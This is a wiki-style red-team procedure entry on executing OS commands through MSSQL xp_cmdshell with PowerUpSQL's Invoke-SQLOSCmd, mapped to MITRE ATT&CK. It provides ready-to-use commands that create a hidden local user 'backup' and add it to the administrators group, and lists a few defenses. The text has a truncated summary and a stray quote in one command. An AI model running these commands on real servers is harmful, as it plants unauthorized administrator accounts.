---
id: c3448777-f08d-431e-b824-26e37f4676b9
name: MSSQL Server Command Execution via xp_cmdshell with Invoke-SQLOSCmd
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:20.240824+00:00'
updated_at: '2023-04-10T20:36:45.361406+00:00'
tactics:
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
tags:
- '[[Command Execution via xp_cmdshell]]'
- '[[MSSQL Server]]'
commands:
- '[[Add local user backup to local administrators group]]'
- '[[Create and add local user backup to local administrators group]]'
- '[[Get current user]]'
---

# MSSQL Server Command Execution via xp_cmdshell with Invoke-SQLOSCmd

## Summary

MSSQL Server's xp_cmdshell is a stored procedure that allows execution of command-line commands from within SQL Server. This can be abused by attackers to execute arbitrary commands on the underlying operating system. The Invoke-SQLOSCmd PowerShell script can be used to execute commands via xp_cmds

## Description

# Description

MSSQL Server's xp_cmdshell is a stored procedure that allows execution of command-line commands from within SQL Server. This can be abused by attackers to execute arbitrary commands on the underlying operating system. The Invoke-SQLOSCmd PowerShell script can be used to execute commands via xp_cmdshell. This script takes advantage of the fact that the xp_cmdshell procedure is enabled by default on some versions of SQL Server, and can be used to execute commands on the target system. This technique can be used to gain access to sensitive information or to perform other malicious activities on the target system.

 

## Requirements

1. Authenticated access to the MSSQL Server

1. xp_cmdshell procedure enabled on the target system

1. PowerShell

 

## Defense

1. Disable xp_cmdshell procedure if not needed

1. Use strong authentication mechanisms to prevent unauthorized access to the MSSQL Server

1. Implement network segmentation to limit access to the MSSQL Server

 

## Objectives

1. Execute arbitrary commands on the underlying operating system

1. Gain access to sensitive information

1. Perform other malicious activities on the target system

 

# Instructions

1. The Invoke-SQLOSCmd command is used to execute operating system commands on a remote SQL Server. The command accepts the following parameters:
-Username: The username used to connect to the SQL Server.
-Password: The password used to connect to the SQL Server.
-Instance: The name of the SQL Server instance to connect to.
-Command: The operating system command to execute on the remote SQL Server.

In the given example, the command is used to execute the 'whoami' command on the remote SQL Server. It is also used to create a local user named 'backup' with the password 'Password1234' and add it to the local administrators group. The command also includes the '-Verbose' parameter to provide detailed output.

 



**Code**: [[PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password]]



> The 'Invoke-SQLOSCmd' command is a PowerShell cmdlet that is used to execute operating system commands on a remote SQL Server. The '-Username' parameter specifies the username used to connect to the SQL Server. The '-Password' parameter specifies the password used to connect to the SQL Server. The '-Instance' parameter specifies the name of the SQL Server instance to connect to. The '-Command' parameter specifies the operating system command to execute on the remote SQL Server. In the given example, the command is used to execute the 'whoami' command on the remote SQL Server. It is also used to create a local user named 'backup' with the password 'Password1234' and add it to the local administrators group. The '-Verbose' parameter is optional and provides detailed output.



**Command** ([[Get current user]]):

```bash
PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command whoami
```





**Command** ([[Create and add local user backup to local administrators group]]):

```bash
PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net user backup Password1234 /add'" -Verbose
```





**Command** ([[Add local user backup to local administrators group]]):

```bash
PowerUpSQL> Invoke-SQLOSCmd -Username sa -Password Password1234 -Instance "<DBSERVERNAME\DBInstance>" -Command "net localgroup administrators backup /add" -Verbose
```



## MITRE ATT&CK Mapping

### Tactics

- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]

## Commands Used

- [[Add local user backup to local administrators group]]
- [[Create and add local user backup to local administrators group]]
- [[Get current user]]

## Tags

- [[Command Execution via xp_cmdshell]]
- [[MSSQL Server]]


